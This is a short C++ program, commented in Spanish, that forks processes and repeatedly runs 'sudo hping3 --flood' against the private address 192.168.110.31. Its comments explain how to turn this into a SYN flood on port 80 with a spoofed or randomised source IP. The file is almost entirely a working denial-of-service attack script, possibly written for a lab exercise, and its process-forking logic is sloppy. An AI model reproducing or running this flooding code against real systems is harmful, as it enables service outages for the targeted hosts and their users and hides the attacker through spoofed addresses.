#include <iostream>
#include <unistd.h>
using namespace std;

void ping()
{
    //Ataco puerto 80, -S activa Flag Syn , floood para enviar paquetes mas rapido
    // -a 192.168.1.100 para poner ip falsa o sino  --rand-source para ip's al azar
    FILE *p = popen("sudo hping3 --flood  192.168.110.31", "r");
    if (!p)
    {
        perror("popen failed");
        //return -1;
    }
    char buffer[256] = { 0 }; ///256 LARGO DE LA CADENA

    while (fgets(buffer, sizeof(buffer), p))
    {
        printf("Output: %s\n", buffer);
    }
    if (p)
        pclose(p);

}
int main()
{
    cout<<("Iniciando...\n");
    int num_procesos;
    cout<<"Ingrese en número de procesos: "<<endl;
    cin>>num_procesos;
    pid_t pid = fork();
    //childs

    for(int i=0;i<num_procesos;i++){
        if (pid == 0)
        {
            ping();
        }
        else if (pid > 0)
        {
            ping();
        }
    }
    printf("Termino el programa\n");
   return 0;
}
